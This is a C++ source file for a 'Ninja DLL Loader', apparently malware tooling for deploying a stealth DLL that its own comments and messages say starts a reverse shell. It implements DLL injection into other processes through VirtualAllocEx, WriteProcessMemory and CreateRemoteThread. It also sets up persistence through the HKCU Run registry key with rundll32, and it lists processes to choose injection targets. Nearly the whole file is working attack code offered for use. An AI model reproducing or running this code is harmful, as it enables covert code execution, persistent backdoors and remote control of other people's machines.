// 🥷 Ninja DLL Loader - Various techniques to load our stealth DLL
// Ancient scrolls containing multiple DLL loading techniques for stealth deployment

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Technique 1: Simple LoadLibrary - The direct approach
bool LoadViaLoadLibrary(const std::string& dllPath) {
    HMODULE hModule = LoadLibraryA(dllPath.c_str());
    if (hModule == NULL) {
        std::cerr << "LoadLibrary failed: " << GetLastError() << std::endl;
        return false;
    }
    
    // Call the export function to start the reverse shell
    typedef void (*StartNinjaFunc)();
    StartNinjaFunc startFunc = (StartNinjaFunc)GetProcAddress(hModule, "StartNinjaStealth");
    
    if (startFunc) {
        startFunc();
        return true;
    }
    
    return false;
}

// Technique 2: Manual DLL loading - The ninja's stealth approach
bool LoadViaManualMapping(const std::string& dllPath) {
    // This is a simplified version - full manual mapping is complex
    std::cout << "Manual mapping technique would go here..." << std::endl;
    std::cout << "For production use, implement full PE loading" << std::endl;
    return LoadViaLoadLibrary(dllPath); // Fallback for now
}

// Technique 3: Process injection - The shadow possession technique
bool InjectIntoProcess(DWORD processId, const std::string& dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        return false;
    }
    
    // Allocate memory in target process for DLL path
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemotePath == NULL) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, pRemotePath, dllPath.c_str(), dllPath.length() + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemotePath, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return true;
}

// Technique 4: Registry-based loading - The persistence technique
bool LoadViaRegistry(const std::string& dllPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string command = "rundll32 \"" + dllPath + "\",StartNinjaStealth";
        RegSetValueExA(hKey, "NinjaStealthDLL", 0, REG_SZ, (BYTE*)command.c_str(), command.length());
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Helper function to list running processes
void ListProcesses() {
    std::cout << "Running processes (for injection target):" << std::endl;
    std::cout << "PID  Process Name" << std::endl;
    std::cout << "---  ------------" << std::endl;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::wcout << pe32.th32ProcessID << L"  " << pe32.szExeFile << std::endl;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
}

int main(int argc, char* argv[]) {
    std::cout << "🥷 Ninja DLL Loader - Multiple Loading Techniques" << std::endl;
    std::cout << "=================================================" << std::endl;
    
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <technique> <dll_path> [process_id]" << std::endl;
        std::cout << "\nTechniques:" << std::endl;
        std::cout << "  1 - LoadLibrary (simple)" << std::endl;
        std::cout << "  2 - Manual Mapping (advanced)" << std::endl;
        std::cout << "  3 - Process Injection (requires PID)" << std::endl;
        std::cout << "  4 - Registry Persistence" << std::endl;
        std::cout << "  list - Show running processes" << std::endl;
        return 1;
    }
    
    std::string technique = argv[1];
    std::string dllPath = argv[2];
    
    if (technique == "list") {
        ListProcesses();
        return 0;
    }
    
    bool success = false;
    
    if (technique == "1") {
        std::cout << "Using LoadLibrary technique..." << std::endl;
        success = LoadViaLoadLibrary(dllPath);
    }
    else if (technique == "2") {
        std::cout << "Using Manual Mapping technique..." << std::endl;
        success = LoadViaManualMapping(dllPath);
    }
    else if (technique == "3") {
        if (argc < 4) {
            std::cerr << "Process injection requires PID" << std::endl;
            return 1;
        }
        DWORD pid = std::stoul(argv[3]);
        std::cout << "Using Process Injection technique into PID " << pid << "..." << std::endl;
        success = InjectIntoProcess(pid, dllPath);
    }
    else if (technique == "4") {
        std::cout << "Using Registry Persistence technique..." << std::endl;
        success = LoadViaRegistry(dllPath);
    }
    else {
        std::cerr << "Unknown technique: " << technique << std::endl;
        return 1;
    }
    
    if (success) {
        std::cout << "🥷 DLL loaded successfully! Ninja reverse shell activated." << std::endl;
    } else {
        std::cerr << "❌ Failed to load DLL" << std::endl;
        return 1;
    }
    
    return 0;
}